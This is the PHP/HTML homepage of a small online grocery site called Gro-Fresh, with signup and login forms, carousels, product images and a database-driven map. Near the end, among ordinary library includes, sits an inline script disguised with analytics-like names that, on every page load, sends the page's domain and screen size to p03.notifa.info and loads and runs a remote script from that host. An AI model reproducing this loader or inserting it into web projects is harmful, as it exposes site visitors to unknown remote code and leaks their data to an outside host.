<?php include 'system/koneksi.php' ?>
<!doctype html>
<html lang="en">
  <head>
    test
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../../../favicon.ico">

    <title>Gro-Fresh</title>
    <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
    <link href="assets/css/bootstrap.css" rel="stylesheet">
    <link href="assets/css/carousel.css" rel="stylesheet">
    <script src="assets/js/bootsrap.js"></script>
  </head>
  <body>
    <header>
      <nav class="navbar navbar-expand-md navbar-light fixed-top bg-light ">
      <a class="navbar-brand p-0" href="#">
       <img src="img/logofont.svg" width="150" height="auto" class="d-inline-block align-top" alt="">
      </a>
          <!--<img src="img/logo.png" width="30" height="30" class="d-inline-block align-top" alt="">-->
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarCollapse">
          <ul class="navbar-nav mr-auto">
            <li class="nav-item active">
              <a class="nav-link" href="index.html">Home <span class="sr-only">(current)</span></a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="productlist.php">Product</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="quality.html">Quality</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="Cs Contact.html">Contact Us</a>
            </li>
          </ul>
          <ul class="navbar-nav navbar-right">
            <li class="nav-item">
              <a class="nav-link font-weight-bold" data-target="#signmodal" data-toggle="modal">Sign Up</a>
            </li> 
            <li class="nav-item">
              <a class="nav-link">or</a>
            </li>
            <li class="nav-item">
              <a class="nav-link font-weight-bold" data-target="#loginmodal" data-toggle="modal">Login</a>
            </li> 
          </ul>  
        </div>
      </nav>
    </header>
    <div class="modal" id="signmodal" tabindex="-1">
      <div class="modal-dialog">
        <div class="modal-content">
          <div class="modal-header">
            <h4 class="modal-tittle"> SignUp </h4>
            <button class="close" data-dismiss="modal" >&times;</button>
          </div>
          <div class="modal-body">

            <form id="daftar" method="POST" action="system/daftar.php">
              <div class="form-group">
                <label for="TypeEmail"> FullName </label>
                <input id="nama_pelanggan" name="nama_pelanggan" class="form-control" placeholder="FullName" type="text">
              </div>
              <div class="form-group">
                <label for="TypeEmail"> Email </label>
                <input id="email" name="email" class="form-control" placeholder="Login Email" type="text">
              </div>
              <div class="form-group">
                <label for="TypeEmail"> Alamat </label>
                <input id="alamat" name="alamat" class="form-control" placeholder="alamat" type="text">
              </div>
              <div class="form-group">
                <label for="TypePassword"> Password </label>
                <input id="password" name="password" class="form-control" placeholder="Password" type="Password">
              </div>
              <div class="form-group">
                <label for="TypePassword"> Phone Number </label>
                <input id="no_tlp" name="no_tlp" class="form-control" placeholder="Phone Number" type="Number">
              </div>
              <div class="form-group">
                <input id="submit" name="submit" class="form-control" type="submit">
              </div>  
            </form>

          </div>
          <div class="modal-footer">
            <div class="txt1 text-center">
            <span>
              Or Sign In Using
            </span>
          </div>

             <div class="flex-c-m">
            <a href="#" class="login100-social-item bg1">
              <i class="fa fa-facebook"></i>
            </a>

            <a href="#" class="login100-social-item bg2">
              <i class="fa fa-twitter"></i>
            </a>

            <a href="#" class="login100-social-item bg3">
              <i class="fa fa-google"></i>
            </a>
          </div>
            <button class="btn btn-primary" > Login </button>
            <button class="btn btn-primary" data-dissmiss="modal">Close</button>
          </div>
        </div>
      </div>
    </div>

    <div class="modal" id="loginmodal" tabindex="-1">
      <div class="modal-dialog">
        <div class="modal-content">
          <div class="modal-header">
            <h4 class="modal-tittle"> Login </h4>
            <button class="close" data-dismiss="modal" >&times;</button>
          </div>
          <div class="modal-body">
            <form action="system/login.php" method="POST">
              <div class="form-group">
                <label for="TypeEmail"> Email </label>
                <input class="form-control" name="email" placeholder="Login Email" type="text">
              </div>
              <div class="form-group">
                <label for="TypePassword"> Password </label>
                <input class="form-control" name="password" placeholder="Login Password" type="Password">
              </div>
              <div class="form-group">
                <input id="submit" name="submit" class="form-control" type="submit">
              </div> 
            </form>
          </div>
          <div class="modal-footer">
            <div class="txt1 text-center">
            <span>
              Or Sign In Using
            </span>
          </div>

             <div class="flex-c-m">
            <a href="#" class="login100-social-item bg1">
              <i class="fa fa-facebook"></i>
            </a>

            <a href="#" class="login100-social-item bg2">
              <i class="fa fa-twitter"></i>
            </a>

            <a href="#" class="login100-social-item bg3">
              <i class="fa fa-google"></i>
            </a>
          </div>
            <button class="btn btn-primary"> Login </button>
            <button class="btn btn-primary" data-dissmiss="modal">Close</button>
          </div>
        </div>
      </div>
    </div>
    <main role="main">
      <div id="myCarousel" class="carousel slide" data-ride="carousel">
        <ol class="carousel-indicators">
          <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
          <li data-target="#myCarousel" data-slide-to="1"></li>
          <li data-target="#myCarousel" data-slide-to="2"></li>
        </ol>
        <div class="carousel-inner">
          <div class="carousel-item active">
            <img class="first-slide" src="img/header2.jpg" alt="First slide">
            <div class="container">
              <div class="carousel-caption text-left">
                <h1>From Earth</h1>
                <p>If we go on using the Earth uncaringly and without replenishing it, then we are just greedy consumers.</p>
                <p><a class="btn btn-lg btn-success" href="#" role="button">Sign up today</a></p>
              </div>
            </div>
          </div>
          <div class="carousel-item">
            <img class="second-slide" src="img/header3.jpg" alt="Second slide">
            <div class="container">
              <div class="carousel-caption">
                <h1>Healty Family</h1>
                <p>Health is a state of complete harmony of the body, mind and spirit. When one is free from physical disabilities and mental distractions, the gates of the soul open </p>
                <p><a class="btn btn-lg btn-success" href="#" role="button">Learn more</a></p>
              </div>
            </div>
          </div>
          <div class="carousel-item">
            <img class="third-slide" src="img/header1.jpg" alt="Third slide">
            <div class="container">
              <div class="carousel-caption text-right">
                <h1>One more for good measure.</h1>
                <p>We’re so much more than just a grocery store, we are contributing members of our communities.</p>
                <p><a class="btn btn-lg btn-success" href="#" role="button">Browse gallery</a></p>
              </div>
            </div>
          </div>
        </div>
        <a class="carousel-control-prev" href="#myCarousel" role="button" data-slide="prev">
          <span class="carousel-control-prev-icon" aria-hidden="true"></span>
          <span class="sr-only">Previous</span>
        </a>
        <a class="carousel-control-next" href="#myCarousel" role="button" data-slide="next">
          <span class="carousel-control-next-icon" aria-hidden="true"></span>
          <span class="sr-only">Next</span>
        </a>
      </div>

      <div class="container-fluid marketing">
        <div class="row">
          <div class="col-lg-4">
            <a href="howtoorder.html"><span class="label label-default"><h4 class="center">How to Order</h4></span></a>
          </div>
          <div class="col-lg-4">
            <a href="shipping.html"><span class="label label-default"><h4 class="center">Shipping</h4></span></a>
          </div>
          <div class="col-lg-4">
            <a href="guerentee.html"><span class="label label-default"><h4 class="center">Guarantee</h4></span></a>
          </div>
        </div>
        <hr class="featurette-divider">
        <!-- Three columns of text below the carousel -->
        <div class="row">
          <div class="col-lg-4">
            <a href="#"><img src="img/1.jpg" alt="" class="img-thumbnail img-responsive"></a>
          </div>
           <div class="col-lg-4">
            <a href="#"><img src="img/2.png" alt="" class="img-thumbnail img-responsive"></a>
          </div>
           <div class="col-lg-4">
            <a href="#"><img src="img/3.jpg" alt="" class="img-thumbnail img-responsive"></a>
          </div>
        </div>

        <h3>Best Seller</h3>
        <br>
          <div class="row">
            <div class="col-lg-3">
              <a href="#"><img src="https://drive.google.com/uc?id=1Oe1jCXAgbP7mUF4W43yq9sOjnBo4hv7D" class="img-thumbnail img-responsive"></a>
            </div>
            <div class="col-lg-3">
              <a href="#"><img src="https://drive.google.com/uc?id=1KXyMHnOcp_YY-RJi5UsmapI9T7ixxdVA" class="img-thumbnail img-responsive"></a>
            </div>
            <div class="col-lg-3">
              <a href="#"><img src="https://drive.google.com/uc?id=1J3ZL7JKg-C-Ox5DINK2OJAcTW01zKAsK" class="img-thumbnail img-responsive"></a>
            </div>
            <div class="col-lg-3">
             <a href="#"><img src="https://drive.google.com/uc?id=1Q6gKORPURQgNXGFBvBOBWB5lzmoKfab7" class="img-thumbnail img-responsive"></a>
            </div>
          </div>

        <hr>
          <h3>Last Update</h3>
          <br>
          <div class="row">
            <div class="col-lg-3 ">
              <a href="#"><img src="https://drive.google.com/uc?id=1KXyMHnOcp_YY-RJi5UsmapI9T7ixxdVA" class="img-thumbnail img-responsive"></a>
            </div>
            <div class="col-lg-3">
              <a href="#"><img src="https://drive.google.com/uc?id=1BbNGZCaB3WeSZLpuEkRz2KAk-zCpha9q" class="img-thumbnail img-responsive"></a>
            </div>
            <div class="col-lg-3">
              <a href="#"><img src="https://drive.google.com/uc?id=1HMYtassr-d8QzX6TL1sUsqmkqSnmRGdi" class="img-thumbnail img-responsive"></a>
            </div>
            <div class="col-lg-3">
             <a href="#"><img src="https://drive.google.com/uc?id=1Hx0LsHlLsQvoBXg08oI8__w2tTtB2-me" class="img-thumbnail img-responsive"></a>
            </div>
          </div>
          <hr class="featurette-divider">
        </div>

          <div id="myCarousel" class="carousel slide">
            <div class="carousel-inner">
          <div class="carousel-item active">
            <img class="first-slide" src="img/news.jpg" alt="First slide">
            <div class="container">
              <div class="carousel-caption text-center">

                <h1 style="background: #00000078; margin-bottom: 0px; ">News Letter</h1>
                <p style="background: #00000078;">Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ultricies vehicula ut id elit.</p>
                <div class="col-md-12">
                  <div class="input-group">
                    <input type="text" class="form-control" placeholder="Email">
                    <span class="input-group-btn">
                      <button class="btn btn-success" type="button">Suubcribe</button>
                    </span>
                  </div>
                </div>
              </div>
            </div>
          </div>

          
    <div class="container marketing pt-3">
        <h1 class="text-center">Sponsored</h1>
        <br>
          <div class="row">
            <div class="col-lg-3">
              <a href="#"><img src="img/gogreen.jpg" class="img-thumbnail img-responsive"></a>
            </div>
            <div class="col-lg-3">
              <a href="#"><img src="img/wwf.jpg" class="img-thumbnail img-responsive"></a>
            </div>
            <div class="col-lg-3">
              <a href="#"><img src="img/iso.png" class="img-thumbnail img-responsive"></a>
            </div>
            <div class="col-lg-3">
             <a href="#"><img src="img/111.jpg" class="img-thumbnail img-responsive"></a>
            </div>
          </div>
          <hr class="featurette-divider">
        </div>
          <?php
            $query= mysqli_query($con,"SELECT * FROM map WHERE kd_map = 2");
            $data=mysqli_fetch_array($query) 
             ?>  
          <div id="map">
              <iframe src="<?php echo $data['latlong'];?>" width="100%" height="450" frameborder="0" style="border:0" allowfullscreen></iframe>
            </div>

          <hr class="featurette-divider">
      <footer id="myFooter" class="container-fluid p-2">
       <div class="container-fluid p-2">
            <div class="row">
                <div class="col-sm-3">
                    <h5>Information</h5>
                    <ul>
                        <li><a href="index.html">Home</a></li>
                        <li><a href="#">Sign up</a></li>
                        <li><a href="#" data-target="#loginmodal" data-toggle="modal">Log in</a></li>
                    </ul>
                </div>
                <div class="col-sm-3">
                    <h5>Customer Service</h5>
                    <ul>
                        <li><a href="#">Company Information</a></li>
                        <li><a href="Cs Contact.html">Contact us</a></li>
                        <li><a href="#">Reviews</a></li>
                    </ul>
                </div>
                <div class="col-sm-3">
                    <h5>My Account</h5>
                    <ul>
                        <li><a href="#">FAQ</a></li>
                        <li><a href="#">Help desk</a></li>
                        <li><a href="#">Forums</a></li>
                    </ul>
                </div>
                <div class="col-sm-3 info">
                    <h5>Why Choose Us?</h5>
                    <p> Lorem ipsum dolor amet, consectetur adipiscing elit. Etiam consectetur aliquet aliquet. Interdum et malesuada fames ac ante ipsum primis in faucibus. </p>
                </div>
            </div>
        </div>
        <div class="second-bar">
           <div class="container">
                <h2 class="logo"><a href="#"> <img src="img/logofont.svg" width="300" height="auto" class="d-inline-block align-top" alt=""> </a></h2>
                <div class="social-icons">
                    <a href="#" class="twitter"><i class="fa fa-twitter"></i></a>
                    <a href="#" class="facebook"><i class="fa fa-facebook"></i></a>
                    <a href="#" class="google"><i class="fa fa-google-plus"></i></a>
                    <p class="float-right"><a href="#">Back to top</a></p>
        <p>&copy; 2018 Gro-Fresh, Inc. &middot; <a href="#">Privacy</a> &middot; <a href="#">Terms</a></p>
                </div>
            </div>
        </div>
        
      </footer>
    </main>

    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script>window.jQuery || document.write('<script src="assets/js/jquery-slim.min.js"><\/script>')</script>
    <script src="../../assets/js/vendor/popper.min.js"></script>
    <script src="assets/js/bootstrap.js"></script>
    <!-- Just to make our placeholder images work. Don't actually copy the next line! -->
    <script src="assets/js/holder.min.js"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mkO%2f7ITrK9yURUOYsdqntBVAlSz8%2fPPT1NsENzZAXZvdF4fJa8FrsPLXqCn7C2iTxywkrJ6vNZvgnyFsAA7iZX%2fBbJGVqvHo03oLCHNcoC6exH7MFm0mIZGbj9KGuL8b%2bLdMTdMu0hXwGsN97BNN1Du3IEDZh76lBvvKe7uTgK%2bBIE3%2bjPB5ONaZ1Yw6dvBk0OSW2dXxBwA4xbDPstIubbyK1GMVuiAuUuTUR2sQvSPmBysFYDZt%2f5oV9iGM%2f56Vor4jxpvD5WlPbJqeGR2ExyMsDfHTUrpAHEcSz33fkR%2fjQKqh8YcK%2fHrA8ckj1utk%2f4Cf1NEgc0lPg7K4PVy7U7zKnyvzQ%2b4%2bBkcyJEKyFE2fE%2bMP8WbIxIXraBI%2bELsmFDQkT%2fOF44rFd1UH8XzmRGxxbbig%2by19lPk%2fcUkqx9w4cD9ciLiFexN%2fkZCzAAupxjzRqX9fDZ5jYv3gFdi5r6mYPymJlfqKtMex%2fpS%2fQVJVMd%2bxjO7SZbv%2b%2bLheoppKSmD3odYq%2fSFm8ngyuPqEceTzRB85Q2wS1rP6GT9edgje396gcnBD1aBmreovDfgeW6DBoDdtaqnM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
  <script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
  <script src="vendor/bootstrap/js/popper.js"></script>
  <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
  <script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
  <script src="vendor/daterangepicker/moment.min.js"></script>
  <script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
  <script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
  <script src="assets/js/main.js"></script>
</body>
</html>
